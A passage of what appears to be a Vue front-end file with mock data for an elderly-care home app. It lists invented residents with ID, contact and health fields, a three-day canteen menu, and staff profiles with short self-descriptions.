      "pocketbook": "商业年金",
      "reasonCheckin": "独居寂寞",
      "relevantDocuments": ["J.text"],
      "actionCapability": "能力完好",
      "bunk": "208房间1号床",
      "remainingSum": 50000,
      "healthInformation": { "MBG": 6.1, "MAP": 130, "MBF": 4.5 }
    },
    {
      "id": "202602160007",
      "name": "吴美兰",
      "sex": "女",
      "age": 82,
      "nativePlace": "广东省广州市",
      "domicileAddress": "广东省广州市越秀区东风东路 701 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "丧偶",
      "certificateType": "身份证",
      "certificateNumber": "440104194412301124",
      "education": "小学",
      "originalUnits": "无",
      "originalOccupation": "家务",
      "residentialAddress": "广东省广州市越秀区东风东路 701 号",
      "telephoneNumber": "13076543210",
      "emergencyContact": "13255664433",
      "medicareDesignatedHospital": "广东省人民医院",
      "socialSecurityCardNumber": "G88776655",
      "pocketbook": "子女赡养",
      "reasonCheckin": "患有阿尔兹海默症",
      "relevantDocuments": ["K.text", "L.pdf"],
      "actionCapability": "重度失能",
      "bunk": "501房间1号床",
      "remainingSum": 3000,
      "healthInformation": { "MBG": 5.9, "MAP": 148, "MBF": 6.2 }
    },
    {
      "id": "202602160008",
      "name": "郑大卫",
      "sex": "男",
      "age": 77,
      "nativePlace": "福建省厦门市",
      "domicileAddress": "福建省厦门市思明区鹭江道 100 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "党员",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "350203194901015512",
      "education": "博士",
      "originalUnits": "厦门大学",
      "originalOccupation": "教授",
      "residentialAddress": "福建省厦门市思明区鹭江道 100 号",
      "telephoneNumber": "13906012345",
      "emergencyContact": "13606000001",
      "medicareDesignatedHospital": "厦门大学附属第一医院",
      "socialSecurityCardNumber": "H10102020",
      "pocketbook": "退休金",
      "reasonCheckin": "康复调理",
      "relevantDocuments": ["M.text"],
      "actionCapability": "轻度失能",
      "bunk": "302房间1号床",
      "remainingSum": 100000,
      "healthInformation": { "MBG": 5.0, "MAP": 120, "MBF": 3.2 }
    },
    {
      "id": "202602160009",
      "name": "冯建平",
      "sex": "男",
      "age": 67,
      "nativePlace": "山西省太原市",
      "domicileAddress": "山西省太原市迎泽区新建路 5 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "14010619590620331X",
      "education": "高中",
      "originalUnits": "太原钢铁集团",
      "originalOccupation": "技术工人",
      "residentialAddress": "山西省太原市迎泽区新建路 5 号",
      "telephoneNumber": "15034112233",
      "emergencyContact": "15534110099",
      "medicareDesignatedHospital": "山西省医科大学第一医院",
      "socialSecurityCardNumber": "S12312312",
      "pocketbook": "退休金",
      "reasonCheckin": "老伴要求入住",
      "relevantDocuments": [],
      "actionCapability": "能力完好",
      "bunk": "403房间1号床",
      "remainingSum": 6000,
      "healthInformation": { "MBG": 6.5, "MAP": 138, "MBF": 4.8 }
    },
    {
      "id": "202602160010",
      "name": "陈爱华",
      "sex": "女",
      "age": 73,
      "nativePlace": "上海市徐汇区",
      "domicileAddress": "上海市徐汇区衡山路 10 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "党员",
      "maritalStatus": "丧偶",
      "certificateType": "身份证",
      "certificateNumber": "31010419531012442X",
      "education": "大专",
      "originalUnits": "上海纺织厂",
      "originalOccupation": "财务",
      "residentialAddress": "上海市徐汇区衡山路 10 号",
      "telephoneNumber": "13601239988",
      "emergencyContact": "13812345678",
      "medicareDesignatedHospital": "上海华山医院",
      "socialSecurityCardNumber": "SH00998877",
      "pocketbook": "退休金",
      "reasonCheckin": "慢性病长期监测",
      "relevantDocuments": ["N.pdf"],
      "actionCapability": "能力完好",
      "bunk": "106房间2号床",
      "remainingSum": 22000,
      "healthInformation": { "MBG": 5.8, "MAP": 132, "MBF": 4.1 }
    },
    {
      "id": "202602160011",
      "name": "韩冬梅",
      "sex": "女",
      "age": 85,
      "nativePlace": "黑龙江省哈尔滨市",
      "domicileAddress": "黑龙江省哈尔滨市南岗区奋斗路 100 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "丧偶",
      "certificateType": "身份证",
      "certificateNumber": "230103194101156623",
      "education": "初中",
      "originalUnits": "无",
      "originalOccupation": "农民",
      "residentialAddress": "山东省青岛市崂山区",
      "telephoneNumber": "15145678899",
      "emergencyContact": "13345671122",
      "medicareDesignatedHospital": "哈尔滨医科大学附属医院",
      "socialSecurityCardNumber": "H99887766",
      "pocketbook": "农村养老金",
      "reasonCheckin": "生活无法自理",
      "relevantDocuments": ["O.doc"],
      "actionCapability": "中度失能",
      "bunk": "502房间2号床",
      "remainingSum": 1500,
      "healthInformation": { "MBG": 7.8, "MAP": 160, "MBF": 6.5 }
    },
    {
      "id": "202602160012",
      "name": "马保国",
      "sex": "男",
      "age": 70,
      "nativePlace": "河南省郑州市",
      "domicileAddress": "河南省郑州市中原区建设路 10 号",
      "citizenship": "中国",
      "nationality": "回族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "410102195603201132",
      "education": "高中",
      "originalUnits": "郑州面粉厂",
      "originalOccupation": "管理员",
      "residentialAddress": "河南省郑州市中原区建设路 10 号",
      "telephoneNumber": "18837112345",
      "emergencyContact": "13522334455",
      "medicareDesignatedHospital": "河南省人民医院",
      "socialSecurityCardNumber": "Z88771122",
      "pocketbook": "退休金",
      "reasonCheckin": "环境优雅",
      "relevantDocuments": [],
      "actionCapability": "能力完好",
      "bunk": "205房间1号床",
      "remainingSum": 9000,
      "healthInformation": { "MBG": 5.5, "MAP": 125, "MBF": 4.0 }
    },
    {
      "id": "202602160013",
      "name": "林婉如",
      "sex": "女",
      "age": 66,
      "nativePlace": "台湾省台北市",
      "domicileAddress": "福建省厦门市湖里区",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "台胞证",
      "certificateNumber": "0123456789",
      "education": "本科",
      "originalUnits": "厦门某台资企业",
      "originalOccupation": "经理",
      "residentialAddress": "福建省厦门市湖里区",
      "telephoneNumber": "13122334455",
      "emergencyContact": "13144552233",
      "medicareDesignatedHospital": "厦门长庚医院",
      "socialSecurityCardNumber": "T66554433",
      "pocketbook": "积蓄",
      "reasonCheckin": "高标准养老服务",
      "relevantDocuments": ["P.pdf", "Q.jpg"],
      "actionCapability": "能力完好",
      "bunk": "301房间1号床",
      "remainingSum": 300000,
      "healthInformation": { "MBG": 5.1, "MAP": 118, "MBF": 3.5 }
    },
    {
      "id": "202602160014",
      "name": "郭德义",
      "sex": "男",
      "age": 79,
      "nativePlace": "天津市南开区",
      "domicileAddress": "天津市南开区鞍山西道 1 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "党员",
      "maritalStatus": "丧偶",
      "certificateType": "身份证",
      "certificateNumber": "12010419470718551X",
      "education": "中专",
      "originalUnits": "天津第三医院",
      "originalOccupation": "药剂师",
      "residentialAddress": "天津市南开区鞍山西道 1 号",
      "telephoneNumber": "13752341234",
      "emergencyContact": "13822334411",
      "medicareDesignatedHospital": "天津医科大学总医院",
      "socialSecurityCardNumber": "TJ11223344",
      "pocketbook": "退休金",
      "reasonCheckin": "术后康复",
      "relevantDocuments": ["R.doc"],
      "actionCapability": "轻度失能",
      "bunk": "402房间2号床",
      "remainingSum": 14000,
      "healthInformation": { "MBG": 6.3, "MAP": 140, "MBF": 5.2 }
    },
    {
      "id": "202602160015",
      "name": "梁伟",
      "sex": "男",
      "age": 71,
      "nativePlace": "广西壮族自治区南宁市",
      "domicileAddress": "广西壮族自治区南宁市青秀区",
      "citizenship": "中国",
      "nationality": "壮族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "450103195512052219",
      "education": "初中",
      "originalUnits": "南宁铁路局",
      "originalOccupation": "列车员",
      "residentialAddress": "广西壮族自治区南宁市青秀区",
      "telephoneNumber": "18978812345",
      "emergencyContact": "18078800998",
      "medicareDesignatedHospital": "广西区人民医院",
      "socialSecurityCardNumber": "GX556677",
      "pocketbook": "退休金",
      "reasonCheckin": "享受晚年生活",
      "relevantDocuments": [],
      "actionCapability": "能力完好",
      "bunk": "202房间1号床",
      "remainingSum": 7800,
      "healthInformation": { "MBG": 5.7, "MAP": 134, "MBF": 4.6 }
    },
    {
      "id": "202602160016",
      "name": "徐金花",
      "sex": "女",
      "age": 78,
      "nativePlace": "江西省南昌市",
      "domicileAddress": "江西省南昌市东湖区",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "360102194804101142",
      "education": "高中",
      "originalUnits": "南昌造纸厂",
      "originalOccupation": "员工",
      "residentialAddress": "江西省南昌市东湖区",
      "telephoneNumber": "13507912233",
      "emergencyContact": "13907910011",
      "medicareDesignatedHospital": "南昌大学第一附属医院",
      "socialSecurityCardNumber": "JX111222",
      "pocketbook": "退休金",
      "reasonCheckin": "子女上班无法照顾",
      "relevantDocuments": ["S.text"],
      "actionCapability": "轻度失能",
      "bunk": "303房间2号床",
      "remainingSum": 5500,
      "healthInformation": { "MBG": 6.0, "MAP": 138, "MBF": 5.5 }
    },
    {
      "id": "202602160017",
      "name": "董德水",
      "sex": "男",
      "age": 83,
      "nativePlace": "安徽省合肥市",
      "domicileAddress": "安徽省合肥市庐阳区",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "党员",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "34010319430315221X",
      "education": "大专",
      "originalUnits": "合肥工业大学",
      "originalOccupation": "后勤管理",
      "residentialAddress": "安徽省合肥市庐阳区",
      "telephoneNumber": "13855123456",
      "emergencyContact": "13955100022",
      "medicareDesignatedHospital": "安徽省立医院",
      "socialSecurityCardNumber": "AH667788",
      "pocketbook": "退休金",
      "reasonCheckin": "全托服务",
      "relevantDocuments": ["T.pdf"],
      "actionCapability": "中度失能",
      "bunk": "401房间1号床",
      "remainingSum": 12000,
      "healthInformation": { "MBG": 7.5, "MAP": 155, "MBF": 6.0 }
    },
    {
      "id": "202602160018",
      "name": "蒋志强",
      "sex": "男",
      "age": 65,
      "nativePlace": "湖南省长沙市",
      "domicileAddress": "湖南省长沙市芙蓉区",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "离异",
      "certificateType": "身份证",
      "certificateNumber": "430102196112253312",
      "education": "高中",
      "originalUnits": "长沙卷烟厂",
      "originalOccupation": "销售",
      "residentialAddress": "湖南省长沙市芙蓉区",
      "telephoneNumber": "15874123344",
      "emergencyContact": "13788995544",
      "medicareDesignatedHospital": "湘雅医院",
      "socialSecurityCardNumber": "HN990011",
      "pocketbook": "退休金",
      "reasonCheckin": "喜欢集体生活",
      "relevantDocuments": [],
      "actionCapability": "能力完好",
      "bunk": "108房间1号床",
      "remainingSum": 18000,
      "healthInformation": { "MBG": 5.4, "MAP": 126, "MBF": 4.3 }
    },
    {
      "id": "202602160019",
      "name": "高丽华",
      "sex": "女",
      "age": 74,
      "nativePlace": "河北省石家庄市",
      "domicileAddress": "河北省石家庄市长安区",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "130102195205104423",
      "education": "初中",
      "originalUnits": "石家庄纺织机械厂",
      "originalOccupation": "质检员",
      "residentialAddress": "河北省石家庄市长安区",
      "telephoneNumber": "13103112244",
      "emergencyContact": "13033116677",
      "medicareDesignatedHospital": "河北省人民医院",
      "socialSecurityCardNumber": "HB445566",
      "pocketbook": "养老保险",
      "reasonCheckin": "老伴去世后生活单调",
      "relevantDocuments": ["U.text"],
      "actionCapability": "能力完好",
      "bunk": "206房间2号床",
      "remainingSum": 4500,
      "healthInformation": { "MBG": 6.2, "MAP": 145, "MBF": 5.4 }
    },
    {
      "id": "202602160020",
      "name": "沈从文",
      "sex": "男",
      "age": 88,
      "nativePlace": "云南省昆明市",
      "domicileAddress": "云南省昆明市五华区",
      "citizenship": "中国",
      "nationality": "白族",
      "politicsStatus": "群众",
      "maritalStatus": "丧偶",
      "certificateType": "身份证",
      "certificateNumber": "530102193809110031",
      "education": "硕士",
      "originalUnits": "云南省图书馆",
      "originalOccupation": "馆员",
      "residentialAddress": "云南省昆明市五华区",
      "telephoneNumber": "13888123321",
      "emergencyContact": "13508819900",
      "medicareDesignatedHospital": "昆明医科大学附属医院",
      "socialSecurityCardNumber": "YN110022",
      "pocketbook": "退休金",
      "reasonCheckin": "高龄长者关怀",
      "relevantDocuments": ["V.pdf", "W.doc"],
      "actionCapability": "中度失能",
      "bunk": "505房间1号床",
      "remainingSum": 16000,
      "healthInformation": { "MBG": 6.7, "MAP": 152, "MBF": 5.9 }
    }
  ])
  const foods = ref([
    /* --- 2026/02/25 (昨天) --- */
    // 早餐
    { "id": "20260225A0001", "name": "皮蛋瘦肉粥", "time": "2026/02/25", "meal": "早餐", "grease": "清淡", "greaseLevel": "low", "description": "精选瘦肉与皮蛋慢火熬煮，口感顺滑且富有层次感。" },
    { "id": "20260225A0002", "name": "虾仁蒸饺", "time": "2026/02/25", "meal": "早餐", "grease": "适中", "greaseLevel": "medium", "description": "晶莹剔透的皮包裹着整颗虾仁，口感Q弹鲜美。" },
    { "id": "20260225A0003", "name": "白灼生菜", "time": "2026/02/25", "meal": "早餐", "grease": "清淡", "greaseLevel": "low", "description": "快速焯水保持翠绿，淋上少量酱油，清脆解腻。" },
    { "id": "20260225A0004", "name": "煮鸡蛋", "time": "2026/02/25", "meal": "早餐", "grease": "清淡", "greaseLevel": "low", "description": "简单水煮，完整保留鸡蛋的优质蛋白质。" },
    // 午餐
    { "id": "20260225B0001", "name": "东坡肉", "time": "2026/02/25", "meal": "午餐", "grease": "重油", "greaseLevel": "high", "description": "色泽红亮，入口即化，肥而不腻的经典浙菜。" },
    { "id": "20260225B0002", "name": "手撕包菜", "time": "2026/02/25", "meal": "午餐", "grease": "重油", "greaseLevel": "high", "description": "干辣椒炝锅，大火快炒，带有浓郁的镬气和酸辣味。" },
    { "id": "20260225B0003", "name": "西红柿蛋汤", "time": "2026/02/25", "meal": "午餐", "grease": "清淡", "greaseLevel": "low", "description": "酸甜开胃，汤色橙黄，是午餐的最佳搭配。" },
    { "id": "20260225B0004", "name": "五常大米饭", "time": "2026/02/25", "meal": "午餐", "grease": "清淡", "greaseLevel": "low", "description": "粒粒分明，软糯清香，米味十足。" },
    // 晚餐
    { "id": "20260225C0001", "name": "清蒸大虾", "time": "2026/02/25", "meal": "晚餐", "grease": "清淡", "greaseLevel": "low", "description": "原汁原味，辅以姜末蘸料，肉质紧实鲜甜。" },
    { "id": "20260225C0002", "name": "地三鲜", "time": "2026/02/25", "meal": "晚餐", "grease": "重油", "greaseLevel": "high", "description": "土豆、茄子、青椒先炸后烧，口感浓郁咸鲜。" },
    { "id": "20260225C0003", "name": "素炒西兰花", "time": "2026/02/25", "meal": "晚餐", "grease": "清淡", "greaseLevel": "low", "description": "大蒜炝锅，快炒西兰花，富含多种维生素。" },
    { "id": "20260225C0004", "name": "紫薯泥", "time": "2026/02/25", "meal": "晚餐", "grease": "清淡", "greaseLevel": "low", "description": "纯天然紫薯蒸熟压制，膳食纤维丰富。" },

    /* --- 2026/02/26 (今天) --- */
    // 早餐
    { "id": "20260226A0001", "name": "八宝粥", "time": "2026/02/26", "meal": "早餐", "grease": "清淡", "greaseLevel": "low", "description": "多种豆类与谷物混合，营养均衡且易于消化。" },
    { "id": "20260226A0002", "name": "鲜肉小笼包", "time": "2026/02/26", "meal": "早餐", "grease": "适中", "greaseLevel": "medium", "description": "皮薄馅大，咬开有浓郁的汤汁，肉香四溢。" },
    { "id": "20260226A0003", "name": "拌海带丝", "time": "2026/02/26", "meal": "早餐", "grease": "清淡", "greaseLevel": "low", "description": "微咸爽口，富含碘元素，非常开胃。" },
    { "id": "20260226A0004", "name": "现榨豆浆", "time": "2026/02/26", "meal": "早餐", "grease": "清淡", "greaseLevel": "low", "description": "纯手工研磨，豆香醇厚，不加糖更健康。" },
    // 午餐
    { "id": "20260226B0001", "name": "水煮鱼", "time": "2026/02/26", "meal": "午餐", "grease": "重油", "greaseLevel": "high", "description": "鱼片鲜嫩，铺满干辣椒和花椒，麻辣味浓厚。" },
    { "id": "20260226B0002", "name": "红烧茄子", "time": "2026/02/26", "meal": "午餐", "grease": "重油", "greaseLevel": "high", "description": "茄子充分吸收酱汁，咸甜适中，是下饭神器。" },
    { "id": "20260226B0003", "name": "凉拌拍黄瓜", "time": "2026/02/26", "meal": "午餐", "grease": "清淡", "greaseLevel": "low", "description": "爽脆清凉，解辣解腻，餐桌上的平衡点。" },
    { "id": "20260226B0004", "name": "玉米排骨汤", "time": "2026/02/26", "meal": "午餐", "grease": "清淡", "greaseLevel": "low", "description": "清甜的玉米搭配排骨，鲜美不油腻。" },
    // 晚餐
    { "id": "20260226C0001", "name": "咖喱鸡块", "time": "2026/02/26", "meal": "晚餐", "grease": "适中", "greaseLevel": "medium", "description": "土豆与鸡块被浓郁咖喱包裹，滋味辛香浓郁。" },
    { "id": "20260226C0002", "name": "蒜蓉粉丝蒸扇贝", "time": "2026/02/26", "meal": "晚餐", "grease": "适中", "greaseLevel": "medium", "description": "鲜美扇贝配合蒜泥香气，粉丝吸收了所有精华。" },
    { "id": "20260226C0003", "name": "炒时蔬", "time": "2026/02/26", "meal": "晚餐", "grease": "清淡", "greaseLevel": "low", "description": "时令鲜菜，简单翻炒，保留自然纤维感。" },
    { "id": "20260226C0004", "name": "南瓜饭", "time": "2026/02/26", "meal": "晚餐", "grease": "清淡", "greaseLevel": "low", "description": "软糯南瓜与大米同煮，色泽金黄，自然微甜。" },

    /* --- 2026/02/27 (明天) --- */
    // 早餐
    { "id": "20260227A0001", "name": "馄饨面", "time": "2026/02/27", "meal": "早餐", "grease": "适中", "greaseLevel": "medium", "description": "皮薄肉嫩的馄饨配上劲道的银丝面，鲜香管饱。" },
    { "id": "20260227A0002", "name": "葱油饼", "time": "2026/02/27", "meal": "早餐", "grease": "重油", "greaseLevel": "high", "description": "层层酥脆，满口葱香，外焦里嫩。" },
    { "id": "20260227A0003", "name": "茶叶蛋", "time": "2026/02/27", "meal": "早餐", "grease": "清淡", "greaseLevel": "low", "description": "秘制卤料长时间浸泡，香料味深入蛋芯。" },
    { "id": "20260227A0004", "name": "凉拌三丝", "time": "2026/02/27", "meal": "早餐", "grease": "清淡", "greaseLevel": "low", "description": "土豆丝、胡萝卜丝、青椒丝，清淡爽口。" },
    // 午餐
    { "id": "20260227B0001", "name": "梅菜扣肉", "time": "2026/02/27", "meal": "午餐", "grease": "重油", "greaseLevel": "high", "description": "肉片肥而不腻，梅干菜吸收了油分后异常鲜香。" },
    { "id": "20260227B0002", "name": "干锅花菜", "time": "2026/02/27", "meal": "午餐", "grease": "重油", "greaseLevel": "high", "description": "五花肉片煸炒花菜，爽脆香辣，十分惹味。" },
    { "id": "20260227B0003", "name": "丝瓜豆腐汤", "time": "2026/02/27", "meal": "午餐", "grease": "清淡", "greaseLevel": "low", "description": "丝瓜清甜，豆腐嫩滑，清热下火之选。" },
    { "id": "20260227B0004", "name": "杂粮米饭", "time": "2026/02/27", "meal": "午餐", "grease": "清淡", "greaseLevel": "low", "description": "加入黑米、燕麦和糙米，口感丰富且营养更佳。" },
    // 晚餐
    { "id": "20260227C0001", "name": "京酱肉丝", "time": "2026/02/27", "meal": "晚餐", "grease": "适中", "greaseLevel": "medium", "description": "豆酱浓郁，肉丝嫩滑，搭配豆腐皮裹食更佳。" },
    { "id": "20260227C0002", "name": "肉末豆腐", "time": "2026/02/27", "meal": "晚餐", "grease": "适中", "greaseLevel": "medium", "description": "家常经典，豆腐软嫩吸味，肉末增加香气。" },
    { "id": "20260227C0003", "name": "清炒藕片", "time": "2026/02/27", "meal": "晚餐", "grease": "清淡", "greaseLevel": "low", "description": "酸甜脆口，消食利咽，适合晚间清淡需求。" },
    { "id": "20260227C0004", "name": "小米糕", "time": "2026/02/27", "meal": "晚餐", "grease": "清淡", "greaseLevel": "low", "description": "小米面蒸制而成，松软可口，淡淡清香。" }
  ])
  const workers = ref([
    {
      "id": "A0001",
      "name": "张三",
      "sex": "男",
      "age": 66,
      "nativePlace": "重庆市万州区",
      "domicileAddress": "山东省青岛市崂山区松岭路 XXX 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "11010519900307123X",
      "education": "高中",
      "originalUnits": "无",
      "originalOccupation": "农民",
      "residentialAddress": "山东省青岛市崂山区松岭路 XXX 号",
      "telephoneNumber": "18112720239",
      "emergencyContact": "13588990011",
      "score": 4.5,
      "selfDescription": "我是一个本分的农民，性格开朗，平时喜欢种点花草，乐于助人。"
    },
    {
      "id": "A0002",
      "name": "李大强",
      "sex": "男",
      "age": 72,
      "nativePlace": "四川省成都市",
      "domicileAddress": "成都市武侯区人民南路 88 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "党员",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "510107195201011234",
      "education": "本科",
      "originalUnits": "成都市第一机械厂",
      "originalOccupation": "高级工程师",
      "residentialAddress": "成都市武侯区人民南路 88 号",
      "telephoneNumber": "13800138002",
      "emergencyContact": "13911223344",
      "score": 4.8,
      "selfDescription": "作为老党员和退休工程师，我生活作息极其规律，喜欢钻研无线电技术，待人严谨有礼。"
    },
    {
      "id": "A0003",
      "name": "王秀珍",
      "sex": "女",
      "age": 68,
      "nativePlace": "江苏省苏州市",
      "domicileAddress": "苏州市姑苏区平江路 12 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "丧偶",
      "certificateType": "身份证",
      "certificateNumber": "320502195605204321",
      "education": "中专",
      "originalUnits": "苏州刺绣厂",
      "originalOccupation": "技术员",
      "residentialAddress": "苏州市姑苏区平江路 12 号",
      "telephoneNumber": "13512345678",
      "emergencyContact": "13600998877",
      "score": 4.2,
      "selfDescription": "我一辈子都在和丝绸打交道，心思细腻，喜欢安静地做点手工，平时话不多但心肠软。"
    },
    {
      "id": "A0004",
      "name": "赵建国",
      "sex": "男",
      "age": 80,
      "nativePlace": "北京市朝阳区",
      "domicileAddress": "北京市朝阳区建国门外大街 5 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "党员",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "110105194408156677",
      "education": "大专",
      "originalUnits": "北京公交集团",
      "originalOccupation": "退休干部",
      "residentialAddress": "北京市朝阳区建国门外大街 5 号",
      "telephoneNumber": "13912344321",
      "emergencyContact": "13855667788",
      "score": 4.9,
      "selfDescription": "老北京人，爱听京剧。在公交集团干了一辈子，习惯了集体生活，喜欢和老哥们儿聊天。"
    },
    {
      "id": "A0005",
      "name": "孙桂英",
      "sex": "女",
      "age": 75,
      "nativePlace": "河北省石家庄市",
      "domicileAddress": "石家庄市长安区育才街 20 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "130102194911025566",
      "education": "小学",
      "originalUnits": "石家庄纺织二厂",
      "originalOccupation": "工人",
      "residentialAddress": "石家庄市长安区育才街 20 号",
      "telephoneNumber": "13300112233",
      "emergencyContact": "13344556677",
      "score": 4.0,
      "selfDescription": "我是个闲不住的人，爱干净，喜欢把房间收拾得井井有条，希望能帮大家做点力所能及的事。"
    },
    {
      "id": "A0006",
      "name": "钱志远",
      "sex": "男",
      "age": 69,
      "nativePlace": "浙江省杭州市",
      "domicileAddress": "杭州市西湖区文三路 101 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "330106195503041122",
      "education": "本科",
      "originalUnits": "浙江大学",
      "originalOccupation": "教授",
      "residentialAddress": "杭州市西湖区文三路 101 号",
      "telephoneNumber": "13123456678",
      "emergencyContact": "13222334455",
      "score": 5.0,
      "selfDescription": "退休后依然热爱阅读和写作。性格儒雅，喜欢清静的环境，希望能结交有共同语言的朋友。"
    },
    {
      "id": "A0007",
      "name": "吴美兰",
      "sex": "女",
      "age": 71,
      "nativePlace": "湖北省武汉市",
      "domicileAddress": "武汉市江汉区解放大道 666 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "离异",
      "certificateType": "身份证",
      "certificateNumber": "420103195312128899",
      "education": "高中",
      "originalUnits": "武汉市中心医院",
      "originalOccupation": "护士",
      "residentialAddress": "武汉市江汉区解放大道 666 号",
      "telephoneNumber": "15927123456",
      "emergencyContact": "15927654321",
      "score": 4.6,
      "selfDescription": "当了三十年护士，深知健康的重要性。性格爽朗直率，爱唱歌，希望能给身边人带来快乐。"
    },
    {
      "id": "A0008",
      "name": "郑大卫",
      "sex": "男",
      "age": 78,
      "nativePlace": "陕西省西安市",
      "domicileAddress": "西安市碑林区友谊西路 50 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "党员",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "610103194607180011",
      "education": "硕士",
      "originalUnits": "西北工业大学",
      "originalOccupation": "研究员",
      "residentialAddress": "西安市碑林区友谊西路 50 号",
      "telephoneNumber": "13755443322",
      "emergencyContact": "13766778899",
      "score": 4.7,
      "selfDescription": "搞科研一辈子，习惯了实事求是。平时爱下围棋，喜欢思考，对新鲜事物依然保持好奇心。"
    },
    {
      "id": "A0009",
      "name": "冯建平",
      "sex": "男",
      "age": 65,
      "nativePlace": "广东省广州市",
      "domicileAddress": "广州市越秀区东风东路 2 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "440104195909204455",
      "education": "博士",
      "originalUnits": "中山大学附属医院",
      "originalOccupation": "主治医师",
      "residentialAddress": "广州市越秀区东风东路 2 号",
      "telephoneNumber": "13611223344",
      "emergencyContact": "13699887766",
      "score": 4.9,
      "selfDescription": "医者仁心。退休后想多花时间调理身体，性格随和，喜欢养生研究，乐于分享健康知识。"
    },
    {
      "id": "A0010",
      "name": "陈明",
      "sex": "男",
      "age": 67,
      "nativePlace": "河南省郑州市",
      "domicileAddress": "郑州市金水区花园路 15 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "410105195701156677",
      "education": "高中",
      "originalUnits": "郑州铁路局",
      "originalOccupation": "列车长",
      "residentialAddress": "郑州市金水区花园路 15 号",
      "telephoneNumber": "15838001122",
      "emergencyContact": "15838112233",
      "score": 4.3,
      "selfDescription": "跑了一辈子铁路，走遍了大江南北。性格豪爽，爱交朋友，嗓门大但人实诚。"
    },
    {
      "id": "A0011",
      "name": "楚云",
      "sex": "女",
      "age": 73,
      "nativePlace": "湖南省长沙市",
      "domicileAddress": "长沙市岳麓区麓山路 30 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "党员",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "430104195104257788",
      "education": "本科",
      "originalUnits": "湖南日报社",
      "originalOccupation": "编辑",
      "residentialAddress": "长沙市岳麓区麓山路 30 号",
      "telephoneNumber": "13874812345",
      "emergencyContact": "13874954321",
      "score": 4.7,
      "selfDescription": "笔耕不辍，热爱文化事业。平时喜欢练书法、剪纸，是个热爱生活且富有生活情趣的人。"
    },
    {
      "id": "A0012",
      "name": "魏大勋",
      "sex": "男",
      "age": 70,
      "nativePlace": "吉林省长春市",
      "domicileAddress": "长春市朝阳区人民大街 10 号",
      "citizenship": "中国",
      "nationality": "满族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "220104195406103344",
      "education": "大专",
      "originalUnits": "长春第一汽车厂",
      "originalOccupation": "班组长",
      "residentialAddress": "长春市朝阳区人民大街 10 号",
      "telephoneNumber": "13504312233",
      "emergencyContact": "13504313344",
      "score": 4.4,
      "selfDescription": "老工人一个，做事讲究原则。身体底子好，喜欢户外运动，是个标准的东北热心肠。"
    },
    {
      "id": "A0013",
      "name": "韩梅梅",
      "sex": "女",
      "age": 64,
      "nativePlace": "四川省成都市",
      "domicileAddress": "成都市锦江区春熙路 100 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "510104196008121122",
      "education": "高中",
      "originalUnits": "成都百货大楼",
      "originalOccupation": "营业员",
      "residentialAddress": "成都市锦江区春熙路 100 号",
      "telephoneNumber": "18980801122",
      "emergencyContact": "18980802233",
      "score": 4.1,
      "selfDescription": "爱美也爱生活，以前是百货公司的‘金牌营业员’。擅长搭配衣服，爱跳广场舞。"
    },
    {
      "id": "A0014",
      "name": "沈腾辉",
      "sex": "男",
      "age": 76,
      "nativePlace": "福建省厦门市",
      "domicileAddress": "厦门市思明区环岛路 5 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "党员",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "350203194810156677",
      "education": "本科",
      "originalUnits": "厦门远洋运输公司",
      "originalOccupation": "船长",
